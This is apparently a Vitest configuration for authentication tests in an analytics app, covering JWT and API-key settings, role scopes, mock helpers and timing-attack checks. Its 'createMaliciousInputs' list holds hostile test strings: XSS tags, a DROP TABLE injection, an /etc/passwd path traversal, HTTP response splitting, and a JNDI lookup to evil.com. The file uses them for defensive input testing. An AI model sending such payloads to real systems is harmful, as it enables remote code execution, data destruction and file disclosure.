/**
 * Authentication Test Configuration
 * 
 * This file configures the comprehensive authentication testing suite
 * including security validation, integration tests, and performance benchmarks.
 */

import { defineConfig } from 'vitest/config';

export const authTestConfig = {
  // Test environment configuration
  testEnvironment: {
    NODE_ENV: 'test',
    JWT_SECRET: 'test-jwt-secret-for-comprehensive-auth-testing-only',
    DATABASE_URL: 'postgresql://test:test@localhost:5432/fieldflux_test',
  },

  // Security test parameters
  security: {
    // JWT Security Settings
    jwt: {
      algorithms: ['HS256'],
      issuer: 'fieldflux',
      audience: 'fieldflux-analytics',
      maxAge: '24h',
      secretMinLength: 32
    },

    // API Key Security Settings
    apiKey: {
      prefix: 'ffa_',
      minLength: 40,
      hashAlgorithm: 'sha256',
      maxKeysPerUser: 5
    },

    // Session Security Settings
    session: {
      maxDuration: 24 * 60 * 60 * 1000, // 24 hours
      suspiciousActivityThresholds: {
        maxLocations: 5,
        maxRequestsPerHour: 1000,
        rapidLocationChanges: 3
      }
    },

    // Rate Limiting Settings
    rateLimiting: {
      general: { windowMs: 15 * 60 * 1000, max: 100 },
      auth: { windowMs: 15 * 60 * 1000, max: 5 },
      analytics: { windowMs: 5 * 60 * 1000, max: 50 }
    }
  },

  // Access Level Configurations for Testing
  accessLevels: {
    viewer: {
      dataScope: 'limited',
      allowedMetrics: ['sessions', 'pageviews', 'users'],
      allowedPeriods: ['7d', '30d'],
      apiQuota: 100,
      rateLimitMultiplier: 1,
      scopes: [
        'analytics:read:metrics',
        'analytics:read:traffic',
        'analytics:read:pages'
      ]
    },
    analyst: {
      dataScope: 'standard',
      allowedMetrics: ['all'],
      allowedPeriods: ['7d', '30d', '90d'],
      apiQuota: 500,
      rateLimitMultiplier: 2,
      scopes: [
        'analytics:read:metrics',
        'analytics:read:traffic',
        'analytics:read:pages',
        'analytics:read:locations',
        'analytics:read:devices',
        'analytics:read:keywords',
        'analytics:generate:reports'
      ]
    },
    admin: {
      dataScope: 'full',
      allowedMetrics: ['all'],
      allowedPeriods: ['all'],
      apiQuota: 2000,
      rateLimitMultiplier: 5,
      scopes: [
        'analytics:read:metrics',
        'analytics:read:traffic',
        'analytics:read:pages',
        'analytics:read:locations',
        'analytics:read:devices',
        'analytics:read:realtime',
        'analytics:read:keywords',
        'analytics:read:reviews',
        'analytics:generate:reports',
        'analytics:export:data'
      ]
    },
    owner: {
      dataScope: 'full',
      allowedMetrics: ['all'],
      allowedPeriods: ['all'],
      apiQuota: 10000,
      rateLimitMultiplier: 10,
      scopes: ['analytics:*']
    }
  },

  // Test Data Generators
  testData: {
    // Generate valid user for testing
    createTestUser: (overrides: any = {}) => ({
      id: 'test-user-123',
      email: 'test@fieldflux.example.com',
      firstName: 'Test',
      lastName: 'User',
      emailVerified: true,
      tenantId: 'test-tenant-456',
      sessionId: 'test-session-789',
      role: 'admin',
      subscriptionPlan: 'professional',
      analyticsEnabled: true,
      isActive: true,
      ...overrides
    }),

    // Generate test tokens
    createTestTokenPayload: (overrides: any = {}) => ({
      sub: 'test-user-123',
      email: 'test@fieldflux.example.com',
      firstName: 'Test',
      lastName: 'User',
      emailVerified: true,
      tenantId: 'test-tenant-456',
      sessionId: 'test-session-789',
      analyticsRole: 'admin',
      scopes: ['analytics:*'],
      type: 'access',
      jti: require('crypto').randomUUID(),
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600,
      ...overrides
    }),

    // Generate malicious test cases
    createMaliciousInputs: () => [
      '<script>alert("xss")</script>',
      '"><script>alert("xss")</script>',
      'DROP TABLE users; --',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      'a'.repeat(10000), // Long string
      '\u0000', // Null byte
      '\r\n\r\nHTTP/1.1 200 OK\r\n\r\n<script>alert(1)</script>' // HTTP response splitting
    ],

    // Generate test API keys
    createTestApiKey: () => {
      const prefix = 'ffa_';
      const randomBytes = require('crypto').randomBytes(32).toString('base64url');
      return `${prefix}${randomBytes}`;
    }
  },

  // Performance Test Thresholds
  performance: {
    authentication: {
      maxResponseTime: 100, // ms
      timingVariance: 50 // ms - to prevent timing attacks
    },
    tokenGeneration: {
      maxTime: 50, // ms
      minEntropy: 128 // bits
    },
    apiKeyGeneration: {
      maxTime: 25, // ms
      uniquenessCheck: 1000 // number of keys to check for uniqueness
    }
  },

  // Security Validation Rules
  validation: {
    // JWT validation rules
    jwt: {
      requiredClaims: ['sub', 'email', 'iat', 'exp', 'iss', 'aud'],
      forbiddenClaims: ['password', 'secret', 'key'],
      maxTokenSize: 8192, // bytes
      clockTolerance: 30 // seconds
    },

    // Input validation rules
    input: {
      maxEmailLength: 320,
      maxNameLength: 100,
      maxScopeLength: 50,
      allowedCharacters: /^[a-zA-Z0-9:_.-]+$/
    },

    // Session validation rules
    session: {
      maxConcurrentSessions: 5,
      ipChangeThreshold: 3, // max IP changes per hour
      locationChangeThreshold: 2 // max country changes per day
    }
  },

  // Error Handling Test Cases
  errorScenarios: [
    {
      name: 'Invalid JWT Secret',
      setup: () => { delete process.env.JWT_SECRET; },
      expectedError: 'JWT_SECRET must be configured'
    },
    {
      name: 'Database Connection Failure',
      mockError: new Error('Database connection failed'),
      expectedStatus: 500
    },
    {
      name: 'Token Signature Mismatch',
      tokenSecret: 'wrong-secret',
      expectedStatus: 401
    },
    {
      name: 'Expired Token',
      tokenExp: Math.floor(Date.now() / 1000) - 3600,
      expectedStatus: 401
    },
    {
      name: 'Revoked Token',
      tokenRevoked: true,
      expectedStatus: 401
    },
    {
      name: 'Inactive User',
      userActive: false,
      expectedStatus: 401
    },
    {
      name: 'Analytics Disabled',
      analyticsEnabled: false,
      expectedStatus: 403
    }
  ],

  // Attack Simulation Test Cases
  attackScenarios: [
    {
      name: 'Algorithm Confusion Attack',
      maliciousAlgorithm: 'none',
      expectedResult: 'rejected'
    },
    {
      name: 'Token Manipulation Attack',
      modifyPayload: true,
      expectedResult: 'rejected'
    },
    {
      name: 'Privilege Escalation Attack',
      escalateRole: 'owner',
      expectedResult: 'rejected'
    },
    {
      name: 'Cross-Tenant Access Attack',
      differentTenant: true,
      expectedResult: 'rejected'
    },
    {
      name: 'Session Hijacking Attack',
      suspiciousActivity: true,
      expectedResult: 'session_revoked'
    },
    {
      name: 'Brute Force Attack Simulation',
      rapidRequests: 100,
      expectedResult: 'rate_limited'
    }
  ]
};

/**
 * Test Utilities
 */
export const testUtils = {
  // JWT token creation helper
  createJWT: (payload: any, secret: string = authTestConfig.testEnvironment.JWT_SECRET) => {
    const jwt = require('jsonwebtoken');
    return jwt.sign(payload, secret, {
      issuer: authTestConfig.security.jwt.issuer,
      audience: authTestConfig.security.jwt.audience,
      algorithm: 'HS256'
    });
  },

  // Mock request creator
  createMockRequest: (overrides: any = {}) => ({
    headers: {},
    cookies: {},
    ip: '127.0.0.1',
    path: '/api/analytics/test',
    method: 'GET',
    query: {},
    params: {},
    body: {},
    correlationId: 'test-correlation-id',
    ...overrides
  }),

  // Mock response creator
  createMockResponse: () => ({
    setHeader: require('vitest').vi.fn(),
    status: require('vitest').vi.fn().mockReturnThis(),
    json: require('vitest').vi.fn().mockReturnThis(),
    send: require('vitest').vi.fn().mockReturnThis(),
    cookie: require('vitest').vi.fn().mockReturnThis(),
    statusCode: 200
  }),

  // Timing attack detection helper
  measureTimingVariance: async (operation: Function, iterations: number = 10) => {
    const timings: number[] = [];
    
    for (let i = 0; i < iterations; i++) {
      const start = process.hrtime.bigint();
      await operation();
      const end = process.hrtime.bigint();
      timings.push(Number(end - start) / 1_000_000); // Convert to ms
    }
    
    const avg = timings.reduce((a, b) => a + b, 0) / timings.length;
    const variance = timings.reduce((sum, time) => sum + Math.pow(time - avg, 2), 0) / timings.length;
    
    return {
      average: avg,
      variance: Math.sqrt(variance),
      min: Math.min(...timings),
      max: Math.max(...timings),
      timings
    };
  },

  // Security assertion helpers
  assertNoSensitiveDataInLogs: (logCalls: any[], sensitivePatterns: string[]) => {
    logCalls.forEach(call => {
      const logMessage = JSON.stringify(call);
      sensitivePatterns.forEach(pattern => {
        expect(logMessage).not.toContain(pattern);
      });
    });
  },

  assertTimingAttackResistance: (timingData: any, thresholdMs: number = 50) => {
    expect(timingData.max - timingData.min).toBeLessThan(thresholdMs);
  },

  assertSecureHeaders: (response: any) => {
    expect(response.headers).toHaveProperty('x-ratelimit-limit');
    expect(response.headers).toHaveProperty('x-ratelimit-remaining');
    expect(response.headers).toHaveProperty('x-ratelimit-reset');
  }
};

export default authTestConfig;